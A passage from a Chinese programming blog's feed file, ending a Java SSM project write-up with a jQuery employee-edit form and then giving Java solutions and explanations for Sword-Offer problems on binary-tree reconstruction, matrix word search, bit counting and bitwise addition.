class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;user.name&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>工号<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;no&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;user.no&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>职位<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;position&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;user.position&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>状态<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;status&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;user.status&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>离职原因<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;reason&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;user.reason&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;info&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;user.id&#125;&quot;</span>&gt;</span>确认更新<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&quot;#info&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> _that = <span class="variable language_">this</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> id = _that.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> url = <span class="string">&quot;http://localhost:8080/User/update&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> name = $(<span class="string">&quot; input[id=&#x27;name&#x27; ] &quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> no = $(<span class="string">&quot; input[id=&#x27;no&#x27; ] &quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> position = $(<span class="string">&quot; input[id=&#x27;position&#x27; ] &quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> status = $(<span class="string">&quot; input[id=&#x27;status&#x27; ] &quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> reason = $(<span class="string">&quot; input[id=&#x27;reason&#x27; ] &quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> data = &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;id&quot;</span>:id,</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;name&quot;</span>:name,</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;no&quot;</span>:no,</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;position&quot;</span>:position,</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;status&quot;</span>:status,</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;reason&quot;</span>:reason</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>: <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">url</span>: url,</span></span><br><span class="line"><span class="language-javascript">            dataType : <span class="string">&quot;text&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            contentType : <span class="string">&quot;application/json&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data),</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//跳转回列表</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> url = <span class="string">&quot;http://localhost:8080/User/findAll&quot;</span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">window</span>.<span class="title function_">open</span>(url,<span class="string">&#x27;_self&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>完完全全跟着别人做的项目，其中有很多东西自己以前学过，现在都忘了，比如ajax，jquary这些前端的知识忘得差不多了，通过这个项目学到了MVC模式程序设计的精妙，也学到了开发的逻辑，巩固了之前学习的SSM框架的知识</p>]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 07. 重建二叉树</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2007.%20%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2007.%20%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入某二叉树的前序遍历和中序遍历的结果，请构建该二叉树并返回其根节点。<br>假设输入的前序遍历和中序遍历的结果中都不含重复的数字。<br><img src="/upload/2022/03/image-ed12a97982f54023967159caafc1608e.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这种题第一次见真的一点思路都没有，太难想了，题解看了半天也才刚刚理解。<br>这里主要用到了前序遍历和中序遍历的性质：<br>前序遍历性质： 节点按照 [ 根节点 | 左子树 | 右子树 ] 排序。<br>中序遍历性质： 节点按照 [ 左子树 | 根节点 | 右子树 ] 排序。</p><p>根据以上性质，可得出以下推论：<br>前序遍历的首元素 为 树的根节点 node 的值。<br>在中序遍历中搜索根节点 node 的索引 ，可将 中序遍历 划分为 [ 左子树 | 根节点 | 右子树 ] 。<br>根据中序遍历中的左（右）子树的节点数量，可将 前序遍历 划分为 [ 根节点 | 左子树 | 右子树 ] 。</p><p>通过以上三步，可确定 三个节点 ：1.树的根节点、2.左子树根节点、3.右子树根节点。<br>根据「分治算法」思想，对于树的左、右子树，仍可复用以上方法划分子树的左右子树。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><strong>分治算法解析：</strong><br>递推参数： 根节点在前序遍历的索引 root 、子树在中序遍历的左边界 left 、子树在中序遍历的右边界 right ；<br>终止条件： 当 left &gt; right ，代表已经越过叶节点，此时返回 null；<br>递推工作：<br>建立根节点 node ： 节点值为 preorder[root] ；<br>划分左右子树： 查找根节点在中序遍历 inorder 中的索引 i ；<br>为了提升效率，可以使用哈希表 dic 存储中序遍历的值与索引的映射，查找操作的时间复杂度为 O(1) ；<br>构建左右子树： 开启左右子树递归；<br>返回值： 回溯返回 node ，作为上一层递归中根节点的左 &#x2F; 右子节点；</p><p><strong>复杂度分析</strong>：<br>时间复杂度 O(N) ： 其中 N 为树的节点数量。初始化 HashMap 需遍历 inorder ，占用 O(N) 。递归共建立 N 个节点，每层递归中的节点建立、搜索操作占用 O(1) ，因此使用 O(N) 时间。<br>空间复杂度 O(N) ： HashMap 使用 O(N) 额外空间；最差情况下（输入二叉树为链表时），递归深度达到 N ，占用 O(N) 的栈帧空间；因此总共使用 O(N) 空间。</p><p><strong>代码：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] preorder;</span><br><span class="line">    HashMap&lt;Integer, Integer&gt; dic = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span>[] inorder)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.preorder = preorder;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; inorder.length; i++)</span><br><span class="line">            dic.put(inorder[i], i);</span><br><span class="line">        <span class="keyword">return</span> recur(<span class="number">0</span>, <span class="number">0</span>, inorder.length - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode <span class="title function_">recur</span><span class="params">(<span class="type">int</span> root, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(left &gt; right) <span class="keyword">return</span> <span class="literal">null</span>;                          <span class="comment">// 递归终止</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(preorder[root]);          <span class="comment">// 建立根节点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> dic.get(preorder[root]);                       <span class="comment">// 划分根节点、左子树、右子树</span></span><br><span class="line">        node.left = recur(root + <span class="number">1</span>, left, i - <span class="number">1</span>);              <span class="comment">// 开启左子树递归</span></span><br><span class="line">        node.right = recur(root + i - left + <span class="number">1</span>, i + <span class="number">1</span>, right); <span class="comment">// 开启右子树递归</span></span><br><span class="line"><span class="comment">//root当前的根 左子树的长度=(i - left +1) 最后+1就是右子树的根了</span></span><br><span class="line">        <span class="keyword">return</span> node;                                           <span class="comment">// 回溯返回根节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二叉树</tag>
      
      <tag>分治</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 12. 矩阵中的路径</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2012.%20%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2012.%20%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>剑指 Offer 12. 矩阵中的路径给定一个 m x n 二维字符网格 board 和一个字符串单词 word 。如果 word 存在于网格中，返回 true ；否则，返回 false 。</p><p>单词必须按照字母顺序，通过相邻的单元格内的字母构成，其中“相邻”单元格是那些水平相邻或垂直相邻的单元格。同一个单元格内的字母不允许被重复使用。</p><p>例如，在下面的 3×4 的矩阵中包含单词 “ABCCED”（单词中的字母已标出）。<br><img src="/upload/2022/02/image-9f707ffb47014576889476ed29753657.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这一题拿到是有一点点思路的，但是自己实现起来太难了。最开始是想着利用双重For循环语句遍历二维数组，来找到字符串中的第一个字符，然后从该字符开始进行上下左右四个方向的遍历，如果这四个值中有值等于字符串的第二个字符，就接着往下面遍历，直到找到完整路径为止。</p><p>但是我试着用这个思路写代码，感觉太难了，便开始看题解。这道题是典型的<strong>矩阵搜索问题，可使用 深度优先搜索（DFS）+ 剪枝</strong> 解决。</p><p><strong>深度优先搜索：</strong> 可以理解为暴力法遍历矩阵中所有字符串可能性。DFS 通过递归，先朝一个方向搜到底，再回溯至上个节点，沿另一个方向搜索，以此类推。<br><strong>剪枝</strong>： 在搜索中，遇到 这条路不可能和目标字符串匹配成功 的情况（例如：此矩阵元素和目标字符不同、此元素已被访问），则应立即返回，称之为 可行性剪枝 。</p><h3 id="DFS-解析"><a href="#DFS-解析" class="headerlink" title="DFS 解析"></a>DFS 解析</h3><p><strong>递归参数</strong>： 当前元素在矩阵 board 中的行列索引 i 和 j ，当前目标字符在 word 中的索引 k 。<br><strong>终止条件</strong>：<br>返回 false ：<br>(1) 行或列索引越界<br>(2) 当前矩阵元素与目标字符不同<br>(3) 当前矩阵元素已访问过 （ (3) 可合并至 (2) ） 。<br>返回 truetrue ： k &#x3D; len(word) - 1 ，即字符串 word 已全部匹配。<br><strong>递推工作：</strong><br>标记当前矩阵元素： 将 board[i][j] 修改为 空字符 ‘’ ，代表此元素已访问过，防止之后搜索时重复访问。<br>搜索下一单元格： 朝当前元素的 上、下、左、右 四个方向开启下层递归，使用 或 连接 （代表只需找到一条可行路径就直接返回，不再做后续 DFS ），并记录结果至 res 。<br>还原当前矩阵元素： 将 board[i][j] 元素还原至初始值，即 word[k] 。<br><strong>返回值：</strong> 返回布尔量 res ，代表是否搜索到目标字符串。</p><p>使用空字符（Python: ‘’ , Java&#x2F;C++: ‘\0’ ）做标记是为了防止标记字符与矩阵原有字符重复。当存在重复时，此算法会将矩阵原有字符认作标记字符，从而出现错误。</p><p><strong>代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">exist</span><span class="params">(<span class="type">char</span>[][] board, String word)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] words = word.toCharArray();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(dfs(board, words, i, j, <span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, <span class="type">char</span>[] word, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= board.length || i &lt; <span class="number">0</span> || j &gt;= board[<span class="number">0</span>].length || j &lt; <span class="number">0</span> || board[i][j] != word[k]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(k == word.length - <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        board[i][j] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">res</span> <span class="operator">=</span> dfs(board, word, i + <span class="number">1</span>, j, k + <span class="number">1</span>) || dfs(board, word, i - <span class="number">1</span>, j, k + <span class="number">1</span>) || </span><br><span class="line">                      dfs(board, word, i, j + <span class="number">1</span>, k + <span class="number">1</span>) || dfs(board, word, i , j - <span class="number">1</span>, k + <span class="number">1</span>);</span><br><span class="line">        board[i][j] = word[k];</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>复杂度分析</strong><br>时间复杂度 O(MN * 3^K)<br>最差情况下，需要遍历矩阵中长度为 K 字符串的所有方案，时间复杂度为 O(3^K)<br>矩阵中共有 MN 个起点，时间复杂度为 O(MN)。<br>方案数计算： 设字符串长度为 K ，搜索中每个字符有上、下、左、右四个方向可以选择，舍弃回头（上个字符）的方向，剩下 3 种选择，因此方案数的复杂度为 O(3^K)<br>空间复杂度 O(K) ： 搜索过程中的递归深度不超过 K ，因此系统因函数调用累计使用的栈空间占用 O(K)（因为函数返回后，系统调用的栈空间会释放）。最坏情况下 K &#x3D; MN，递归深度为 MN ，此时系统栈使用 O(MN) 的额外空间。</p>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dfs深度优先</tag>
      
      <tag>回溯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 15. 二进制中1的个数  &amp;&amp; 剑指 Offer 65. 不用加减乘除做加法</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2015.%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD1%E7%9A%84%E4%B8%AA%E6%95%B0%20%20&amp;&amp;%20%E5%89%91%E6%8C%87%20Offer%2065.%20%E4%B8%8D%E7%94%A8%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E5%81%9A%E5%8A%A0%E6%B3%95/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2015.%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD1%E7%9A%84%E4%B8%AA%E6%95%B0%20%20&amp;&amp;%20%E5%89%91%E6%8C%87%20Offer%2065.%20%E4%B8%8D%E7%94%A8%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E5%81%9A%E5%8A%A0%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="二进制中1的个数"><a href="#二进制中1的个数" class="headerlink" title="二进制中1的个数"></a>二进制中1的个数</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个函数，输入是一个无符号整数（以二进制串的形式），返回其二进制表达式中数字位数为 ‘1’ 的个数（也被称为 汉明重量).）。</p><p> <br>提示：<br>请注意，在某些语言（如 Java）中，没有无符号整数类型。在这种情况下，输入和输出都将被指定为有符号整数类型，并且不应影响您的实现，因为无论整数是有符号的还是无符号的，其内部的二进制表示形式都是相同的。<br>在 Java 中，编译器使用 二进制补码 记法来表示有符号整数。因此，在下面的 示例 3 中，输入表示有符号整数 -3。</p><p><img src="/upload/2022/03/image-3da4fe69c29646c9b2ff2e1c2e980516.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这种题均是使用位运算进行处理：<br><strong>与运算 &amp;</strong> ：，两个数都为1时结果才为1，如果其中有一个不为1结果为0。n&amp;1, 可以用来判断n的最后一位是否为1<br><strong>或运算 |</strong><br><strong>右移运算 &gt;&gt;</strong> : 将多位二进制数最后n位抹掉，相当于除以二并且取整。在Java中&gt;&gt;是带符号位的右移运算，也就是右移操作符号位不会变，如果是无符号位的右移运算操作为 &gt;&gt;&gt;<br><strong>左移运算 &lt;&lt;</strong> ： 相当于乘以二<br><strong>异或运算 ^</strong> ：当且且仅当a和b中仅有一个为1时其结果为1，如果a和b都为0或者都为1结果为0</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><strong>方法一：逐位判断</strong><br>根据 与运算 定义，设二进制数字 n ，则有：<br>若 n&amp;1&#x3D;0 ，则 n 二进制 最右一位 为 0 ；<br>若 n&amp;1&#x3D;1 ，则 n 二进制 最右一位 为 1 。<br>根据以上特点，考虑以下 循环判断 ：<br>判断 n 最右一位是否为 1 ，根据结果计数。<br>将 n 右移一位（本题要求把数字 n 看作无符号数，因此使用 无符号右移 操作）。</p><p>算法流程：<br>初始化数量统计变量 res&#x3D;0 。<br>循环逐位判断： 当 n&#x3D;0 时跳出。<br>res +&#x3D; n &amp; 1 ： 若n&amp;1&#x3D;1 ，则统计数 res 加一。<br>n &gt;&gt;&#x3D; 1 ： 将二进制数字 n 无符号右移一位（ Java 中无符号右移为 “&gt;&gt;&gt;” ） 。<br>返回统计数量 res 。</p><p>复杂度分析：<br>时间复杂度 O(log2 n) ： 此算法循环内部仅有 移位、与、加 等基本运算，占用 O(1) ；逐位判断需循环 log2 n 次，其中 log2 n 代表数字 n 最高位 1 的所在位数（例如 log2​ 4&#x3D;2, log2​ 16&#x3D;4）。<br>空间复杂度 O(1) ： 变量 res 使用常数大小额外空间。</p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hammingWeight</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n != <span class="number">0</span>) &#123;</span><br><span class="line">            res += n &amp; <span class="number">1</span>;</span><br><span class="line">            n &gt;&gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>方法二：巧用 n&amp;(n−1)</strong><br>(n−1) 解析： 二进制数字 n 最右边的 1 变成 0 ，此 1 右边的 0 都变成 1 。<br>n&amp;(n−1) 解析： 二进制数字 n 最右边的 1 变成 0 ，其余不变。<br><img src="/upload/2022/03/image-40c637d3b9284b81b762fa1ecfa55472.png" alt="image.png"></p><p>算法流程：<br>初始化数量统计变量 res。<br>循环消去最右边的 1 ：当 n&#x3D;0 时跳出。<br>res +&#x3D; 1 ： 统计变量加 1 ；<br>n &amp;&#x3D; n - 1 ： 消去数字 n 最右边的 1 。<br>返回统计数量 res 。</p><p>复杂度分析：<br>时间复杂度 O(M) ：n&amp;(n−1) 操作仅有减法和与运算，占用O(1) ；设 M 为二进制数字 n 中 1 的个数，则需循环 M 次（每轮消去一个 1 ），占用 O(M) 。<br>空间复杂度 O(1) ： 变量 res 使用常数大小额外空间。</p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hammingWeight</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n != <span class="number">0</span>) &#123;</span><br><span class="line">            res++;</span><br><span class="line">            n &amp;= n - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="不用加减乘除做加法"><a href="#不用加减乘除做加法" class="headerlink" title="不用加减乘除做加法"></a>不用加减乘除做加法</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>写一个函数，求两个整数之和，要求在函数体内不得使用 “+”、“-”、“*”、“&#x2F;” 四则运算符号。</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>本题考察对位运算的灵活使用，即使用位运算实现加法。<br>无进位和 与 异或运算 规律相同，进位和 与 与运算 规律相同（并需左移一位）。因此，无进位和 n 与进位 c 的计算公式如下；<br><img src="/upload/2022/03/image-f139aa1f6fdc4a8980e1612d91ea6311.png" alt="image.png"></p><p>（和 s ）&#x3D;（非进位和 n ）+（进位 c ）。即可将s&#x3D;a+b 转化为：<br>s&#x3D;a+b⇒s&#x3D;n+c<br>循环求 n 和 c ，直至进位 c&#x3D;0 ；此时 s&#x3D;n ，返回 n 即可。<br><img src="/upload/2022/03/image-1303938835bf46f9a5489d70af77a926.png" alt="image.png"></p><p>Q ： 若数字 a 和 b 中有负数，则变成了减法，如何处理？<br>A ： 在计算机系统中，数值一律用 补码 来表示和存储。补码的优势： 加法、减法可以统一处理（CPU只有加法器）。因此，以上方法 同时适用于正数和负数的加法 </p><h2 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2><p>复杂度分析：<br>时间复杂度 O(1) ： 最差情况下（例如 a&#x3D; 0x7fffffff , b &#x3D; 1 时），需循环 32 次，使用 O(1) 时间；每轮中的常数次位操作使用 O(1)时间。<br>空间复杂度 O(1) ： 使用常数大小的额外空间。</p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(b != <span class="number">0</span>) &#123; <span class="comment">// 当进位为 0 时跳出</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> (a &amp; b) &lt;&lt; <span class="number">1</span>;  <span class="comment">// c = 进位</span></span><br><span class="line">            a ^= b; <span class="comment">// a = 非进位和</span></span><br><span class="line">            b = c; <span class="comment">// b = 进位</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>位运算</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 16. 数值的整数次方</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2016.%20%E6%95%B0%E5%80%BC%E7%9A%84%E6%95%B4%E6%95%B0%E6%AC%A1%E6%96%B9/"/>
